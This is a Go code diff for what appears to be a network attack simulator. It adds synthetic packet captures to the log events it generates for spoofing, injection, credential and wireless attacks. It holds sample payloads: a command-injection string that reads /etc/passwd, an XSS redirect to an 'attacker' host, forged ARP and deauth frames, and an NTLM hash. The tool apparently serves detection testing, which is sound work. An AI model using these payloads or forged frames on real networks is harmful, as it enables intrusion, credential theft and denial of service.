@@ -21,6 +21,7 @@ func runARPSpoofing(req AttackRequest) (*AttackResult, error) {
 	attackerDev := getAttackerDevice()
 	switches := getSwitches()
 
+	var frames [][]byte
 	for _, swDev := range switches {
 		if swDev.DeviceType != "switch" {
 			continue
@@ -32,7 +33,21 @@ func runARPSpoofing(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 	}
-	logInfo("Return from runARPSpoofing syslogs=%d", result.SyslogCount)
+
+	// PCAP: gratuitous ARP reply claiming to own victimIP, sent to broadcast
+	srcMAC := parseMACAddress(attackerDev.MACAddress)
+	broadMAC := parseMACAddress("FF:FF:FF:FF:FF:FF")
+	for idx := 0; idx < 5; idx++ {
+		reply := buildARPReply(srcMAC, broadMAC, victimIP, victimIP)
+		frame := buildEthernetFrameARP(srcMAC, broadMAC, reply, 0x0806)
+		frames = append(frames, frame)
+	}
+	path, _ := writePCAPFile(req.RunID, "arp_spoof", frames, defaultDuration)
+	if path != "" {
+		result.PCAPFiles = append(result.PCAPFiles, path)
+	}
+
+	logInfo("Return from runARPSpoofing syslogs=%d pcap=%d", result.SyslogCount, len(result.PCAPFiles))
 	return result, nil
 }
 
@@ -58,6 +73,20 @@ func runIPSourceSpoof(req AttackRequest) (*AttackResult, error) {
 		result.FlowCount++
 		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", spoofIP, targetIP, "TCP", flows)
 		result.EventIDs = append(result.EventIDs, flowID)
+
+		// PCAP: single forged-source TCP SYN, MAC addresses synthesized since
+		// a spoofed source IP has no real device entry to pull a MAC from
+		targetDev, _ := getDeviceByIP(targetIP)
+		if targetDev != nil {
+			srcMAC := [6]byte{0x00, 0xAA, 0x11, 0x22, 0x33, byte(rand.Intn(255))}
+			dstMAC := parseMACAddress(targetDev.MACAddress)
+			syn := buildTCPSegment(randomPort(), 443, 0x02, rand.Uint32(), 0, nil)
+			frame := buildEthernetFrame(srcMAC, dstMAC, buildIPv4Packet(spoofIP, targetIP, 6, syn))
+			path, _ := writePCAPFile(req.RunID, "ip_source_spoof", [][]byte{frame}, defaultDuration)
+			if path != "" {
+				result.PCAPFiles = append(result.PCAPFiles, path)
+			}
+		}
 	}
 	return result, nil
 }
@@ -78,6 +107,12 @@ func runDNSSpoofing(req AttackRequest) (*AttackResult, error) {
 	result.SyslogCount++
 	eventID, _ := recordRunEvent(req.RunID, "syslog", dnsDev.Name, req.AttackerIP, dnsDev.IPAddress, "UDP", ev)
 	result.EventIDs = append(result.EventIDs, eventID)
+
+	// PCAP: forged DNS response with attacker's chosen answer (cache poisoning)
+	path, _ := PCAPDNSQueryResponse(req.RunID, "dns_spoof", req.AttackerIP, dnsDev.IPAddress, domain, false)
+	if path != "" {
+		result.PCAPFiles = append(result.PCAPFiles, path)
+	}
 	return result, nil
 }
 
@@ -87,16 +122,26 @@ func runMACSpoofing(req AttackRequest) (*AttackResult, error) {
 
 	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
 	targetMAC := getAttackParam(req.Params, "target_mac", "00:11:22:33:44:05")
+	attackerDev := getAttackerDevice()
 
-	for _, swDev := range getRouters() {
-		if swDev.DeviceType != "switch" {
-			continue
-		}
+	for _, swDev := range getSwitches() {
 		msg := fmt.Sprintf("MAC address %s has moved from port Gi0/1 to port Gi0/5 — possible MAC spoofing", targetMAC)
 		ev := sendSyslog(swDev, msg, 3)
 		result.SyslogCount++
 		eventID, _ := recordRunEvent(req.RunID, "syslog", swDev.Name, req.AttackerIP, "broadcast", "ETH", ev)
 		result.EventIDs = append(result.EventIDs, eventID)
+
+		// PCAP: attacker's frame using the cloned/target MAC as source
+		if attackerDev != nil {
+			clonedMAC := parseMACAddress(targetMAC)
+			dstMAC := parseMACAddress(swDev.MACAddress)
+			syn := buildTCPSegment(randomPort(), 80, 0x02, rand.Uint32(), 0, nil)
+			frame := buildEthernetFrame(clonedMAC, dstMAC, buildIPv4Packet(attackerDev.IPAddress, swDev.IPAddress, 6, syn))
+			path, _ := writePCAPFile(req.RunID, "mac_spoof", [][]byte{frame}, defaultDuration)
+			if path != "" {
+				result.PCAPFiles = append(result.PCAPFiles, path)
+			}
+		}
 	}
 	return result, nil
 }
@@ -126,6 +171,15 @@ func runSQLInjection(req AttackRequest) (*AttackResult, error) {
 			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
+
+		// PCAP: one representative request/response pair
+		reqPayload := []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=%s&password=x",
+			endpoint, targetIP, payloads[0]))
+		respPayload := []byte("HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\n\r\n")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "sql_injection", req.AttackerIP, targetIP, 80, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
+		}
 	}
 	return result, nil
 }
@@ -143,6 +197,14 @@ func runCommandInjection(req AttackRequest) (*AttackResult, error) {
 		result.SyslogCount++
 		eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
 		result.EventIDs = append(result.EventIDs, eventID)
+
+		// PCAP
+		reqPayload := []byte(fmt.Sprintf("GET /ping?host=8.8.8.8;cat%%20/etc/passwd HTTP/1.1\r\nHost: %s\r\n\r\n", targetIP))
+		respPayload := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "command_injection", req.AttackerIP, targetIP, 80, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
+		}
 	}
 	return result, nil
 }
@@ -155,12 +217,21 @@ func runXSSInjection(req AttackRequest) (*AttackResult, error) {
 		if targetDev == nil {
 			continue
 		}
+		token := randomHexString(8)
 		msg := fmt.Sprintf("%s - - \"GET /search?q=<script>document.location='http://attacker/%s'</script> HTTP/1.1\" 200 1234",
-			req.AttackerIP, randomHexString(8))
+			req.AttackerIP, token)
 		ev := sendSyslog(targetDev, msg, 4)
 		result.SyslogCount++
 		eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
 		result.EventIDs = append(result.EventIDs, eventID)
+
+		// PCAP
+		reqPayload := []byte(fmt.Sprintf("GET /search?q=<script>document.location='http://attacker/%s'</script> HTTP/1.1\r\nHost: %s\r\n\r\n", token, targetIP))
+		respPayload := []byte("HTTP/1.1 200 OK\r\nContent-Length: 1234\r\n\r\n")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "xss_injection", req.AttackerIP, targetIP, 80, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
+		}
 	}
 	return result, nil
 }
@@ -179,6 +250,14 @@ func runLDAPInjection(req AttackRequest) (*AttackResult, error) {
 		result.SyslogCount++
 		eventID, _ := recordRunEvent(req.RunID, "syslog", dcDev.Name, req.AttackerIP, dcIP, "TCP", ev)
 		result.EventIDs = append(result.EventIDs, eventID)
+
+		// PCAP
+		reqPayload := []byte("(|(uid=*)(password=*))")
+		respPayload := []byte("LDAP_RESULT: success")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "ldap_injection", req.AttackerIP, dcIP, 389, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
+		}
 	}
 	return result, nil
 }
@@ -295,13 +374,23 @@ func runCredentialStuffing(req AttackRequest) (*AttackResult, error) {
 		if targetDev == nil {
 			continue
 		}
+		var lastUser string
 		for idx := 0; idx < min(listSize, 20); idx++ {
 			user := fmt.Sprintf("user%d@corp.local", rand.Intn(1000))
+			lastUser = user
 			msg := fmt.Sprintf("Authentication failed for %s from %s — invalid credentials (credential stuffing suspected)", user, req.AttackerIP)
 			ev := sendSyslog(targetDev, msg, 4)
 			result.SyslogCount++
 			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "HTTPS", ev)
 			result.EventIDs = append(result.EventIDs, eventID)
+		}
+
+		// PCAP: one representative login attempt
+		reqPayload := []byte(fmt.Sprintf("POST /login HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nemail=%s&password=leaked123", targetIP, lastUser))
+		respPayload := []byte("HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "credential_stuffing", req.AttackerIP, targetIP, 443, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
 		}
 	}
 	return result, nil
@@ -324,6 +413,14 @@ func runKerberoasting(req AttackRequest) (*AttackResult, error) {
 			eventID, _ := recordRunEvent(req.RunID, "syslog", dcDev.Name, req.AttackerIP, dcIP, "TCP", ev)
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
+
+		// PCAP: TGS-REQ/TGS-REP exchange (port 88, Kerberos), text approximation
+		reqPayload := []byte(fmt.Sprintf("TGS-REQ: sname=%s realm=CORP.LOCAL", spns[0]))
+		respPayload := []byte("TGS-REP: ticket=<RC4-HMAC encrypted blob>")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "kerberoasting", req.AttackerIP, dcIP, 88, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
+		}
 	}
 	return result, nil
 }
@@ -341,6 +438,15 @@ func runPassTheHash(req AttackRequest) (*AttackResult, error) {
 		result.SyslogCount++
 		eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "SMB", ev)
 		result.EventIDs = append(result.EventIDs, eventID)
+
+		// PCAP: NTLM auth exchange over SMB (port 445), text approximation
+		hash := getAttackParam(req.Params, "hash", "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
+		reqPayload := []byte(fmt.Sprintf("NTLMSSP_AUTH: hash=%s", hash))
+		respPayload := []byte("SMB2_SESSION_SETUP: STATUS_SUCCESS")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "pass_the_hash", req.AttackerIP, targetIP, 445, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
+		}
 
 		lateralFlows := FlowLateral(req.AttackerIP, targetIP)
 		fw := getFirewall()
@@ -423,6 +529,14 @@ func runDGA(req AttackRequest) (*AttackResult, error) {
 			eventID, _ := recordRunEvent(req.RunID, "syslog", dnsDev.Name, infectedIP, dnsDev.IPAddress, "UDP", ev)
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
+
+		// PCAP: one representative NXDOMAIN lookup
+		if len(dgaDomains) > 0 {
+			path, _ := PCAPDNSQueryResponse(req.RunID, "dga", infectedIP, dnsDev.IPAddress, dgaDomains[len(dgaDomains)-1], true)
+			if path != "" {
+				result.PCAPFiles = append(result.PCAPFiles, path)
+			}
+		}
 	}
 
 	// Real packets (Option A — real DNS lookups for DGA domains)
@@ -472,13 +586,23 @@ func runHTTPCovertChannel(req AttackRequest) (*AttackResult, error) {
 	fw := getFirewall()
 
 	for _, infectedIP := range req.TargetIPs {
+		var lastData string
 		for idx := 0; idx < count; idx++ {
 			encodedData := randomHexString(64)
+			lastData = encodedData
 			msg := fmt.Sprintf("Outbound HTTP: src=%s dst=%s header X-Custom-Data: %s", infectedIP, c2Dev.IPAddress, encodedData)
 			ev := sendSyslog(fw, msg, 6)
 			result.SyslogCount++
 			eventID, _ := recordRunEvent(req.RunID, "syslog", "fw-perimeter", infectedIP, c2Dev.IPAddress, "HTTP", ev)
 			result.EventIDs = append(result.EventIDs, eventID)
+		}
+
+		// PCAP
+		reqPayload := []byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nX-Custom-Data: %s\r\n\r\n", c2Dev.IPAddress, lastData))
+		respPayload := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "http_covert", infectedIP, c2Dev.IPAddress, 80, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
 		}
 
 		// Real packets (Option A — HTTP with covert headers)
@@ -548,6 +672,14 @@ func runPsExec(req AttackRequest) (*AttackResult, error) {
 			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "SMB", ev)
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
+
+		// PCAP: SMB service creation request/response, text approximation
+		reqPayload := []byte(fmt.Sprintf("SVCCTL_CreateServiceW: name=PSEXESVC binPath=%%SystemRoot%%\\PSEXESVC.exe"))
+		respPayload := []byte("SVCCTL_CreateServiceW_RESP: STATUS_SUCCESS")
+		path, _ := PCAPGenericTCPExchange(req.RunID, "psexec", req.AttackerIP, targetIP, 445, reqPayload, respPayload)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
+		}
 	}
 	return result, nil
 }
@@ -597,12 +729,19 @@ func runRogueAP(req AttackRequest) (*AttackResult, error) {
 	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
 	ssid := getAttackParam(req.Params, "ssid", "Corp-WiFi")
 
+	rogueMAC := [6]byte{0x00, 0xaa, 0xbb, 0xcc, 0xdd, 0xff}
 	for _, apDev := range getWirelessAPs() {
 		msg := fmt.Sprintf("Rogue AP detected: SSID '%s' MAC 00:aa:bb:cc:dd:ff RSSI -65dBm on channel 6 — evil twin suspected", ssid)
 		ev := sendSyslog(apDev, msg, 2)
 		result.SyslogCount++
 		eventID, _ := recordRunEvent(req.RunID, "syslog", apDev.Name, req.AttackerIP, apDev.IPAddress, "802.11", ev)
 		result.EventIDs = append(result.EventIDs, eventID)
+
+		// PCAP: rogue AP's beacon frame advertising the spoofed SSID
+		path, _ := PCAP80211Beacon(req.RunID, rogueMAC, ssid)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
+		}
 	}
 	return result, nil
 }
@@ -616,14 +755,22 @@ func runDeauth(req AttackRequest) (*AttackResult, error) {
 		if apDev.Name != apName && apName != "" {
 			continue
 		}
+		apMAC := parseMACAddress(apDev.MACAddress)
 		for idx := 0; idx < 10; idx++ {
-			clientMAC := fmt.Sprintf("aa:bb:cc:%02x:%02x:%02x", rand.Intn(256), rand.Intn(256), rand.Intn(256))
+			clientMACStr := fmt.Sprintf("aa:bb:cc:%02x:%02x:%02x", rand.Intn(256), rand.Intn(256), rand.Intn(256))
 			msg := fmt.Sprintf("Deauthentication flood: %d deauth frames from %s targeting client %s — denial of service",
-				100+rand.Intn(400), req.AttackerIP, clientMAC)
+				100+rand.Intn(400), req.AttackerIP, clientMACStr)
 			ev := sendSyslog(apDev, msg, 2)
 			result.SyslogCount++
 			eventID, _ := recordRunEvent(req.RunID, "syslog", apDev.Name, req.AttackerIP, apDev.IPAddress, "802.11", ev)
 			result.EventIDs = append(result.EventIDs, eventID)
+		}
+
+		// PCAP: deauth frames targeting one synthesized client
+		clientMAC := parseMACAddress(fmt.Sprintf("aa:bb:cc:%02x:%02x:%02x", rand.Intn(256), rand.Intn(256), rand.Intn(256)))
+		path, _ := PCAP80211Deauth(req.RunID, apMAC, clientMAC, 10)
+		if path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, path)
 		}
 		break
 	}
